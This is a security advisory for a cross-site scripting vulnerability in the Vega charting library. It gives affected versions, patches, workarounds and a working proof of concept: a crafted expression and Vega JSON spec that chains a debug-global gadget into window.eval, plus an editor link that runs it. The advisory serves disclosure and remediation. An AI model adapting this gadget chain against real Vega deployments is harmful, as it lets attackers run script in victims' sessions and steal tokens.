# [H] Vega Cross-Site Scripting (XSS) via expressions abusing toString calls in environments using the VEGA_DEBUG global variable

## Summary
Severity: High
Advisory: GHSA-7f2v-3qq3-vvjf
CVE: CVE-2025-59840
CWE: CWE-79
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2025-11-13
Source: https://github.com/advisories/GHSA-7f2v-3qq3-vvjf
Type: github-advisory

## Affected
- npm: `vega` — affected >=0 <6.2.0
- npm: `vega-expression` — affected >=6.0.0 <6.1.0
- npm: `vega-interpreter` — affected >=2.0.0 <2.2.1
- npm: `vega-interpreter` — affected >=0 <1.2.1
- npm: `vega-expression` — affected >=0 <5.2.1

## Details
## Impact

Applications meeting 2 conditions are at risk of arbitrary JavaScript code execution, even if "safe mode" [expressionInterpreter](https://vega.github.io/vega/usage/interpreter/) is used. 

1. Use `vega` in an application that attaches `vega` library and a `vega.View` instance similar to the Vega [Editor](https://github.com/vega/editor) to the global `window`
2. Allow user-defined Vega `JSON` definitions (vs JSON that was is only provided through source code)

## Patches

- If using latest Vega line (6.x)
  - `vega` `6.2.0` / `vega-expression` `6.1.0` / `vega-interpreter`  `2.2.1` (if using AST evaluator mode)
- If using Vega in a non-ESM environment
  -  ( `vega-expression` `5.2.1` / `1.2.1` (if using AST evaluator mode)

## Workarounds

_Is there a way for users to fix or remediate the vulnerability without upgrading_

- Do not attach `vega` View instances to global variables, as Vega editor used to do [here](https://github.com/vega/editor/blob/e102355589d23cdd0dbfd607a2cc5f9c5b7a4c55/src/components/renderer/renderer.tsx#L239)
- Do not attach `vega` to the global window as the editor used to do [here](https://github.com/vega/editor/blob/e102355589d23cdd0dbfd607a2cc5f9c5b7a4c55/src/index.tsx#L14-L16)

These practices of attaching the vega library and View instances may be convenient for debugging, but should _not_ be used in production or in any situation where vega/vega-lite definitions could be provided by untrusted parties.

### POC Summary

Vega offers the evaluation of expressions in a secure context. Arbitrary function call is prohibited. When an event is exposed to an expression, member get of window objects is possible. Because of this exposure, in some applications, a crafted object that overrides its toString method with a function that results in calling `this.foo(this.bar)`, DOM XSS can be achieved. 

In practice, an accessible gadget like this exists in the global VEGA_DEBUG code. 

```js
({
    toString: event.view.VEGA_DEBUG.vega.CanvasHandler.prototype.on, 
    eventName: event.view.console.log,
    _handlers: {
        undefined: 'alert(origin + ` XSS on version `+ VEGA_DEBUG.VEGA_VERSION)'
    },
    _handlerIndex: event.view.eval
})+1
```

### POC Details
```json
{
  "$schema": "https://vega.github.io/schema/vega/v5.json",
  "width": 350,
  "height": 350,
  "autosize": "none",
  "description": "Toggle Button",
  "signals": [
    {
      "name": "toggle",
      "value": true,
      "on": [
        {
          "events": {"type": "click", "markname": "circle"},
          "update": "toggle ? false : true"
        }
      ]
    },
    {
      "name": "addFilter",
      "on": [
        {
          "events": {"type": "mousemove", "source": "window"},
          "update": "({toString:event.view.VEGA_DEBUG.vega.CanvasHandler.prototype.on, eventName:event.view.console.log,_handlers:{undefined:'alert(origin + ` XSS on version `+ VEGA_DEBUG.VEGA_VERSION)'},_handlerIndex:event.view.eval})+1"
        }

      ]
    }
  ]
}
```

This payload creates a scenario where whenever the mouse is moved, the toString function of the provided object is implicitly called when trying to resolve adding it with 1. The toString function has been overridden to a "gadget function" (VEGA_DEBUG.vega.CanvasHandler.prototype.on) that does the following:

```js
   on(a, o) {
        const u = this.eventName(a)
          , d = this._handlers;
        if (this._handlerIndex(d[u], a, o) < 0) {
        ....
        }
        ....
   }
```

1. Set `u` to the result of calling `this.eventName` with undefined 
    - For our object, we have the eventName value set to console.log, which just logs undefined and returns undefined
3. Sets `d` to `this._handlers`
    - For our object, we have this defined to be used later
4. Calls `this._handlerIndex` with the result of `u` indexed into the `d` object as the first argument, and undefined as the second two.
    - For our object, `_handlerIndex` is set to window.eval, and when indexing undefined into the `_handlers`, a string to be evald containing the XSS payload is returned.
    
This results in XSS by using a globally scoped gadget to get full blown eval. 


### PoC Link

Navigate [to vega editor](https://vega.github.io/editor/#/url/vega/N4IgJAzgxgFgpgWwIYgFwhgF0wBwqgegIDc4BzJAOjIEtMYBXAI0poHsDp5kTykSArJQBWENgDsQAGhAB3GgBN6aAMwCADDPg0yWVRplIGmNhBoAvOGhDiJVmQrjQATjRyZ2k9ABU2ZMgA2cAAEAELGJpIyZmTiSAEQaADaoHEIVugm-kHSIMTxDBmYzoUyEsmgcKTimImooJgAnjgZIFABNFAA1rnIzl1prVA0zu1WAL4yDDgKSJitWYEhAPzBAGbxECGowcWFIOMAupOpSOnWSAoKAGI0AfPOueWoKSBVcDV1Dc2tCGwMWz+pFyYgYo1a8nECjYsgOUxmc1aAApgCYAMrFGjiMiod41SjEGhwWSUABqAFEAOIAQQA+gARcmhACqlIJfEoAGEkOJ8hAABI8hRBZyUHDONgmJotSgSKTBPGYAByZzguOqmAJRJJUAkYiClACfiktJgQpF+GADChcDWWLgClQAHJ4nBnJgkWxXLRxMEANTBAAGwQAGmi0cEJMFSM4zFHAwGKTSGUzWWSqXSKQAlNEASQA8kqAJROyam81u3M2gAe6o+msJxMoVXi4yLfoAjAdjscgA), move the mouse, and observe that the arbitrary JavaScript from the configuration reaches the eval sink and DOM XSS is achieved.

### Future investigation

In cases where `VEGA_DEBUG` is not enabled, there theoreticallycould  be other gadgets on the global scope that allow for similar behavior. In cases where AST evaluator is used and there are blocks against getting references to `eval`, in theory there could be other gadgets on global scope (i.e. jQuery) that would allow for eval the same way (i.e. `$.globalEval`). As of this writing, no such globally scoped gadgets have been found. 

### Impact

This vulnerability allows for DOM XSS, potentially stored, potentially reflected, depending on how the library is being used. The vulnerability requires user interaction with the page to trigger.  

An attacker can exploit this issue by tricking a user into opening a malicious Vega specification. Successful exploitation allows the attacker to execute arbitrary JavaScript in the context of the application’s domain. This can lead to theft of sensitive information such as authentication tokens, manipulation of data displayed to the user, or execution of unauthorized actions on behalf of the victim. This exploit compromises confidentiality and integrity of impacted applications.

## References
- https://github.com/vega/vega/security/advisories/GHSA-7f2v-3qq3-vvjf
- https://nvd.nist.gov/vuln/detail/CVE-2025-59840
- https://github.com/vega/editor/blob/e102355589d23cdd0dbfd607a2cc5f9c5b7a4c55/src/components/renderer/renderer.tsx#L239
- https://github.com/vega/editor/blob/e102355589d23cdd0dbfd607a2cc5f9c5b7a4c55/src/index.tsx#L14-L16
- https://github.com/vega/vega
- https://vega.github.io/editor/#/url/vega/N4IgJAzgxgFgpgWwIYgFwhgF0wBwqgegIDc4BzJAOjIEtMYBXAI0poHsDp5kTykSArJQBWENgDsQAGhAB3GgBN6aAMwCADDPg0yWVRplIGmNhBoAvOGhDiJVmQrjQATjRyZ2k9ABU2ZMgA2cAAEAELGJpIyZmTiSAEQaADaoHEIVugm-kHSIMTxDBmYzoUyEsmgcKTimImooJgAnjgZIFABNFAA1rnIzl1prVA0zu1WAL4yDDgKSJitWYEhAPzBAGbxECGowcWFIOMAupOpSOnWSAoKAGI0AfPOueWoKSBVcDV1Dc2tCGwMWz+pFyYgYo1a8nECjYsgOUxmc1aAApgCYAMrFGjiMiod41SjEGhwWSUABqAFEAOIAQQA+gARcmhACqlIJfEoAGEkOJ8hAABI8hRBZyUHDONgmJotSgSKTBPGYAByZzguOqmAJRJJUAkYiClACfiktJgQpF+GADChcDWWLgClQAHJ4nBnJgkWxXLRxMEANTBAAGwQAGmi0cEJMFSM4zFHAwGKTSGUzWWSqXSKQAlNEASQA8kqAJROyam81u3M2gAe6o+msJxMoVXi4yLfoAjAdjscgA
- https://vega.github.io/vega/usage/interpreter
